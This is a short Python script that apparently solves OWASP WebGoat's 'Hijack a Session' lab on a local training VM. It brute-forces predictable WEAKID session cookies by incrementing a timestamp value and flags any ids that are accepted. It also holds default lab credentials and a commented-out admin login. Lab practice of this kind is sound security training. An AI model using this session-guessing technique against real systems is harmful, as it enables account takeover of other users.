import requests
import re
import urllib.parse

url = "http://192.168.238.142/WebGoat/attack"
login = ('root','owaspbwa')

data = {'start': 'Start WebGoat'}
find = "Hijack a Session"

token = ['11368', '1592634296767']

for i in range(1, 55):
    session = requests.Session()

    r1 = session.get(url, auth=login)
    r2 = session.post(url, data, auth=login)

    m = re.search("attack\?Screen=(\d+).*%s"%find, r2.text)
    if not m is None:
        scr= m.group(1)

        params = {'Screen': scr, 'menu': '1800'}
        q = urllib.parse.urlencode(params)

        nurl = f'{url}?{q}'

        sid = f'{token[0]}-{int(token[1])+i}'
        # print(sid)
        session.cookies.set('WEAKID', sid)

        r3 = session.get(nurl)

        id1 = session.cookies.get_dict()['WEAKID']
        if "Please sign in to your account" not in r3.text:
            print("found a valid session id being used")
            print(id1.split("-"))
        
        data= {
            'Username': 'admin',
            'Password': 'admin'
        }

        # print()
        session.close()
# r4 = session.post(nurl, data=data)

# print(r4.text)
# print(r4.cookies.get_dict())
# print(session.cookies.get_dict())
